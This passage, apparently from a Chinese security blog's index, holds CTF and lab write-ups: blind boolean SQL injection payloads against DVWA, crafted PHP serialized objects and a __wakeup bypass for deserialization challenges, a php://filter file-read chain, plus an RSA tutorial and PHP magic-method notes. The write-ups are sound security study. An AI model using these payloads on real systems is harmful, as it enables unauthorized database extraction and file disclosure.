7.获取数据库的其他信息：版本、用户… LOW源码分析&lt;?phpif( isset( $_GET[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $id = $_GET[ &#x27;id&#x27; ]; // Check database $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $getid ); // Removed &#x27;or die&#x27; to suppress mysql errors // Get results $num = @mysqli_num_rows( $result ); // The &#x27;@&#x27; character suppresses errors//最后的判断只有两种num大于0输出User ID exists in the databasenum小于等于0 输出User ID is MISSING from the database if( $num &gt; 0 ) &#123; // Feedback for end user echo &#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;; &#125; else &#123; // User wasn&#x27;t found, so the page wasn&#x27;t! header( $_SERVER[ &#x27;SERVER_PROTOCOL&#x27; ] . &#x27; 404 Not Found&#x27; ); // Feedback for end user echo &#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 解决方法对传参没有进行任何检查、过滤，返回参数只有User ID exists in the database.和User ID is MISSING from the database.两种 （1）首先找到注入点，判断注入的类型 1 1 \\ 1&#x27; # 猜闭合方式 （2）查找库名（以数据库名的第一个字母为例）（最终查到的库名：dvwa） 1&#x27; and (select ascii(substr(database(),1,1)) &gt; 111) # 1&#x27; and (select ascii(substr(database(),1,1)) &gt; 120) # 1&#x27; and (select ascii(substr(database(),1,1)) &gt; 115) # 1&#x27; and (select ascii(substr(database(),1,1)) &gt; 113) # 1&#x27; and (select ascii(substr(database(),1,1)) = 100) # 数据库的substr函数用法： 1、SUBSTR(str,pos,len): 从pos开始的位置，截取len个字符 1 substr(string ,1,3) ：取string左边第1位置起，3字长的字符串。 所以结果为： str 1 substr(string, -1,3)：取string右边第1位置起，3字长的字符串。显然右边第一位置起往右不够3字长。 结果只能是： g 1 substr(string, -3,3)：取string右边第3位置起，3字长的字符串。 结果为: ing （3）查找表名（以数据库的第一个表的第一个字母为例）（最终查到的表名：guestbook） 1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) &gt; 101) #1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) &gt; 110) #1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) &gt; 105) #1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) &gt; 103) #1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) &gt; 102) #1&#x27; and (select ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)) = 103) # （4）查找表中的第一个字段名（以数据库中第一个表的第一个字段为例）（最终查到的列名：comment_id） 1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &gt; 101) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 101) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 90) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 95) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 98) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 99) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) &lt; 100) #1&#x27; and (select ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;dvwa&#x27; and table_name=&#x27;guestbook&#x27; limit 0,1),1,1)) = 99) # （5）查找数据库中第一个表中第一个字段中的第一个数据的第一个字母（最终查到的数据：1） 1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 101) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 50) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 30) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 40) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 45) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) &gt; 48) #1&#x27; and (select ascii(substr((select comment_id from guestbook limit 0,1),1,1)) = 49) #","categories":[{"name":"DVWA","slug":"DVWA","permalink":"http://alunxzhou.github.io/categories/DVWA/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://alunxzhou.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"php-SER-libs反序列化靶场","slug":"php-SER-libs反序列化靶场","date":"2023-01-07T09:08:00.000Z","updated":"2023-01-07T09:10:06.489Z","comments":true,"path":"2023/01/07/php-SER-libs反序列化靶场/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/php-SER-libs%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/","excerpt":"level1&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class a&#123; var $act; function action()&#123; eval($this-&gt;act); &#125;&#125;$a=unserialize($_GET[&#x27;flag&#x27;]);$a-&gt;action();?&gt;","text":"level1&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class a&#123; var $act; function action()&#123; eval($this-&gt;act); &#125;&#125;$a=unserialize($_GET[&#x27;flag&#x27;]);$a-&gt;action();?&gt; 构造类的实例化 &lt;?phpclass a&#123; var $act; function action()&#123; eval($this-&gt;act); &#125;&#125;$a=new a();$a-&gt;act=&quot;show_source(&#x27;flag.php&#x27;);&quot;;echo serialize($a);?&gt; level2&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class mylogin&#123; var $user; var $pass; function __construct($user,$pass)&#123; $this-&gt;user=$user; $this-&gt;pass=$pass; &#125; function login()&#123; if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123; return 1; &#125; &#125;&#125;$a=unserialize($_GET[&#x27;param&#x27;]);if($a-&gt;login())&#123; echo $flag;&#125;?&gt; 看代码的意思$a-&gt;login()为真时，输出flag 也就是uesr=daydream pass=ok 构造 &lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class mylogin&#123; var $user; var $pass; function __construct($user,$pass)&#123; $this-&gt;user=$user; $this-&gt;pass=$pass; &#125; function login()&#123; if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123; return 1; &#125; &#125;&#125;//$aa=new mylogin();$aa-&gt;user=&quot;daydream&quot;;$aa-&gt;pass=&quot;ok&quot;;$s=serialize($aa);print_r()?&gt; payload ?param=O:7:”mylogin”:2:{s:4:”user”;s:8:”daydream”;s:4:”pass”;s:2:”ok”;} level3&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);class mylogin&#123; var $user; var $pass; function __construct($user,$pass)&#123; $this-&gt;user=$user; $this-&gt;pass=$pass; &#125; function login()&#123; if ($this-&gt;user==&quot;daydream&quot; and $this-&gt;pass==&quot;ok&quot;)&#123; return 1; &#125; &#125;&#125;$a=unserialize($_COOKIE[&#x27;param&#x27;]);if($a-&gt;login())&#123; echo $flag;&#125;?&gt; 和上一题的payload一样，不过把param后面的值进行url编码 ![img]1671089842139-0a4d683f-f080-41bb-a5dd-22e61914c88e.png)","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://alunxzhou.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"基础RSA","slug":"基础RSA","date":"2023-01-07T09:05:45.000Z","updated":"2023-01-07T09:07:05.325Z","comments":true,"path":"2023/01/07/基础RSA/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%9F%BA%E7%A1%80RSA/","excerpt":"什么是RSARSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语根据密钥的使用方法，可以将密码分为对称密码和公钥密码对称密码：加密和解密使用同一种密钥的方式公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 RSA加密RSA的加密过程可以使用一个通式来表达","text":"什么是RSARSA算法是现今使用最广泛的公钥密码算法，也是号称地球上最安全的加密算法。在了解RSA算法之前，先熟悉下几个术语根据密钥的使用方法，可以将密码分为对称密码和公钥密码对称密码：加密和解密使用同一种密钥的方式公钥密码：加密和解密使用不同的密码的方式，因此公钥密码通常也称为非对称密码。 RSA加密RSA的加密过程可以使用一个通式来表达 密文＝明文EmodN密文＝明文EmodN也就是说RSA加密是对明文的E次方后除以N后求余数的过程。就这么简单？对，就是这么简单。从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说E和N的组合就是公钥，我们用(E,N)来表示公钥 公钥＝(E,N)公钥＝(E,N)不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。顺便啰嗦一句E是加密（Encryption）的首字母，N是数字（Number）的首字母 RSA解密RSA的解密同样可以使用一个通式来表达 明文＝密文DmodN明文＝密文DmodN也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥 私钥＝(D,N)私钥＝(D,N)从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。 小结下 公钥 （E，N）私钥 （D，N）密钥对 （E，D，N）加密密文＝明文EmodN密文＝明文EmodN解密明文＝密文DmodN明文＝密文DmodN\\4. 生成密钥对既然公钥是（E，N），私钥是（D，N）所以密钥对即为（E，D，N）但密钥对是怎样生成的？步骤如下： 求N求L（L为中间过程的中间数）求E求D4.1 求N准备两个质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N N=p∗qN=p∗q4.2 求LL 是 p－1 和 q－1的最小公倍数，可用如下表达式表示 L=lcm（p－1，q－1）L=lcm（p－1，q－1）4.3 求EE必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1用gcd(X,Y)来表示X，Y的最大公约数则E条件如下： 1 &lt; E &lt; Lgcd（E，L）=1之所以需要E和L的最大公约数为1是为了保证一定存在解密时需要使用的数D。现在我们已经求出了E和N也就是说我们已经生成了密钥对中的公钥了。 4.4 求D数D是由数E计算出来的。D、E和L之间必须满足以下关系： 1 &lt; D &lt; LE＊D mod L ＝ 1只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。简单地说条件2是为了保证密文解密后的数据就是明文。现在私钥自然也已经生成了，密钥对也就自然生成了。小结下： 求N N＝ p ＊ q ；p，q为质数求L L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数求E 1 &lt; E &lt; L，gcd（E，L）=1；E，L最大公约数为1（E和L互质）求D 1 &lt; D &lt; L，E＊D mod L ＝ 15 实践下吧我们用具体的数字来实践下RSA的密钥对对生成，及其加解密对全过程。为方便我们使用较小数字来模拟。 5.1 求N我们准备两个很小对质数，p ＝ 17q ＝ 19N ＝ p ＊ q ＝ 323 5.2 求LL ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144144为16和18对最小公倍数 5.3 求E求E必须要满足2个条件：1 &lt; E &lt; L ，gcd（E，L）=1即1 &lt; E &lt; 144，gcd（E，144） ＝ 1E和144互为质数，5显然满足上述2个条件故E ＝ 5 此时公钥=(E，N）＝ （5，323） 5.4 求D求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1显然当D＝ 29 时满足上述两个条件1 &lt; 29 &lt; 1445＊29 mod 144 ＝ 145 mod 144 ＝ 1此时私钥＝（D，N）＝（29，323） 5.5 加密准备的明文必须时小于N的数，因为加密或者解密都要mod N其结果必须小于N假设明文 ＝ 123则 密文＝明文EmodN＝1235mod323=225密文＝明文EmodN＝1235mod323=2255.6 解密明文＝密文DmodN＝22529mod323=123明文＝密文DmodN＝22529mod323=123解密后的明文为123。https://blog.csdn.net/dbs1215/article/details/48953589 附上一脚本 # -*- coding: utf-8 -*-# @Time : 2022/12/6 10:10# @Author : 阿伦# @File : 1# @Project : pyimport gmpy2e = 65537p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407n = p * q# 密文C = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034d = gmpy2.invert(e, (p - 1) * (q - 1))print(d)# 求明文M = pow(C, d, n) # 快速求幂取模运算print(M)","categories":[{"name":"RSA基础","slug":"RSA基础","permalink":"http://alunxzhou.github.io/categories/RSA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"http://alunxzhou.github.io/tags/RSA/"}]},{"title":"一道反序列化","slug":"一道反序列化","date":"2023-01-07T09:03:45.000Z","updated":"2023-01-07T09:05:01.358Z","comments":true,"path":"2023/01/07/一道反序列化/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E4%B8%80%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"打开一看啥也没有，看看源码 根据以上源码泄露，是文件包含漏洞，配合封装协议读取文件源码 包含了class.php文件。 这里得讲到file_get_contents()函数 file_get_contents() 函数把整个文件读入一个字符串中。 这里的字符串是$user参数接受的，利用它的文件封装协议来读取$file参数include的文件 当然这里要使第一个条件成立。还需要讲到一个文件封装协议 php://input 是个可以访问请求的原始数据的只读流 第一个条件： if(isset($user)&amp;&amp;(file_get_contents($user,’r’)===”admin”)) 使$user的值等于admin，并且使$user接收读入的文件 可利用php://input绕过 成功绕过 现在利用php伪协议读取class.php源码，格式为base64加密 &lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE); class Read&#123;//f1a9.php public $file; public function __toString()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); &#125; return &quot;__toString was called!&quot;; &#125;&#125;?&gt; 我们构造反序列化的参数：O:4:”Read”:1:{s:4:”file”;s:57:”php://filter/read=convert.base64-encode/resource=f1a9.php”;} 这里也是利用php://filter来读取flag文件 base64解密后 &lt;?phperror_reporting(E_ALL &amp; ~E_NOTICE);//flag&#123;hSh_ctf:e@syt0g3t&#125;?&gt;","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"常用魔法函数","slug":"常用魔法函数","date":"2023-01-07T09:02:21.000Z","updated":"2023-01-07T09:03:06.067Z","comments":true,"path":"2023/01/07/常用魔法函数/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E5%B8%B8%E7%94%A8%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/","excerpt":"1、__get、__set这两个方法是为在类和他们的父类中没有声明的属性而设计的__get( $property ) 当调用一个未定义的属性时访问此方法__set( $property, $value ) 给一个未定义的属性赋值时调用这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）2、__isset、__unset__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）3、__call__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法4、__autoload__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。5、__construct、__destruct__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。6、__clonePHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。7、__toString__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。8、__sleep、__wakeup__sleep 串行化的时候用__wakeup 反串行化的时候调用serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。9、__set_state当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。10、__invoke当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效11、__callStatic它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。","text":"1、__get、__set这两个方法是为在类和他们的父类中没有声明的属性而设计的__get( $property ) 当调用一个未定义的属性时访问此方法__set( $property, $value ) 给一个未定义的属性赋值时调用这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）2、__isset、__unset__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）3、__call__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法4、__autoload__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。5、__construct、__destruct__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。6、__clonePHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。7、__toString__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。8、__sleep、__wakeup__sleep 串行化的时候用__wakeup 反串行化的时候调用serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。9、__set_state当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ =&gt; value, …)格式排列的类属性。10、__invoke当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效11、__callStatic它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(SWPUCTF 2021 新生赛)ez_unserialize","slug":"SWPUCTF-2021-新生赛-ez-unserialize","date":"2023-01-07T09:00:15.000Z","updated":"2023-01-07T09:01:31.872Z","comments":true,"path":"2023/01/07/SWPUCTF-2021-新生赛-ez-unserialize/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/","excerpt":"","text":"常规来看，找不到题目，找源码。 源码不给提示。扫目录 robots.txt里面有不能访问的文件名 代码分析 &lt;?phperror_reporting(0);show_source(&quot;cl45s.php&quot;);class wllm&#123; //定义了一个wllm类 public $admin; //定义类属性admin public $passwd; //定义类属性passwd public function __construct()&#123; //魔法方法中的__construct方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称 $this-&gt;admin =&quot;user&quot;; //定义wllm类中的admin属性值为user $this-&gt;passwd = &quot;123456&quot;; //定义wllm类中的passwd属性值为123456 &#125; public function __destruct()&#123; //魔法方法————dustruct，析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法 if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; //当admin=admin，passwd=ctf时输出flag include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; //反之，输出admin、passwd以及just a bit more echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125;&#125;$p = $_GET[&#x27;p&#x27;]; //用get方法接收参数punserialize($p); //将参数p反序列化?&gt; 所以解题的关键在于将p参数反序列化的内容序列化，一负一正得出flag 所以构造序列化代码 &lt;?phpclass wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125;&#125;$aa=new wllm(); //aa为wllm的实例化对象$aa-&gt;admin=&quot;admin&quot;; //aa的admin属性值为admin$aa-&gt;passwd=&quot;ctf&quot;; //aa的passwd属性值为ctf$s=serialize($aa); //将aa序列化赋值给sprint_r($s); //输出s?&gt; payload ?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}","categories":[{"name":"反序列化","slug":"反序列化","permalink":"http://alunxzhou.github.io/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://alunxzhou.github.io/tags/web%E6%BC%8F%E6%B4%9E/"}]},{"title":"(绕过_wakeup魔法函数)[SWPUCTF 2021 新生赛]no_wakeup","slug":"绕过-wakeup魔法函数-SWPUCTF-2021-新生赛-no-wakeup","date":"2023-01-07T08:58:06.000Z","updated":"2023-01-07T08:59:20.892Z","comments":true,"path":"2023/01/07/绕过-wakeup魔法函数-SWPUCTF-2021-新生赛-no-wakeup/","link":"","permalink":"http://alunxzhou.github.io/2023/01/07/%E7%BB%95%E8%BF%87-wakeup%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0-SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-no-wakeup/","excerpt":"&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __wakeup()&#123; //_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务 $this-&gt;passwd = sha1($this-&gt;passwd); &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;passwd; echo &quot;No wake up&quot;; &#125; &#125; &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt;","text":"&lt;?phpheader(&quot;Content-type:text/html;charset=utf-8&quot;);error_reporting(0);show_source(&quot;class.php&quot;);class HaHaHa&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __wakeup()&#123; //_wakeup魔法函数，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务 $this-&gt;passwd = sha1($this-&gt;passwd); &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;passwd; echo &quot;No wake up&quot;; &#125; &#125; &#125;$Letmeseesee = $_GET[&#x27;p&#x27;];unserialize($Letmeseesee);?&gt; 在34行程序调用反序列化方法时，会自动执行__weakup()函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过__weakup()函数； php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 __weakup(); 因而先构造序列化 &lt;?phpclass HaHaHa&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __wakeup()&#123; $this-&gt;passwd = sha1($this-&gt;passwd); &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;wllm&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;passwd; echo &quot;No wake up&quot;; &#125; &#125; &#125;$aa=new HaHaHa();$aa-&gt;admin=&quot;admin&quot;;$aa-&gt;passwd=&quot;wllm&quot;;$stus=serialize($aa);print_r($stus);?&gt; 将序列化得到的 O:6:”HaHaHa”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;} 改为 O:6:”HaHaHa”:3:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:4:”wllm”;} 